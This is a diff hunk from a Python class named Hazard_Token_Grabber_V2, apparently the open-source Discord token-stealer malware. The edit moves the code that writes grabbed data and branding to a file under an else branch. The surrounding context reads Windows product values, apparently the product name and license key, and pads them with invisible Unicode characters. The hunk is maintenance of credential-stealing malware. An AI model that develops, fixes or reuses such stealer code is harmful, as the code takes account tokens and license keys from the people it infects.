@@ -434,12 +434,13 @@ class Hazard_Token_Grabber_V2(functions):
                             os.remove(path)
                         except PermissionError:
                             pass
-                    with open(path, "w", encoding="utf-8") as f:
-                        f.write(
-                            "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
-                    with open(path, "a", encoding="utf-8") as fp:
-                        fp.write(
-                            x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                    else:
+                        with open(path, "w", encoding="utf-8") as f:
+                            f.write(
+                                "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                        with open(path, "a", encoding="utf-8") as fp:
+                            fp.write(
+                                x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
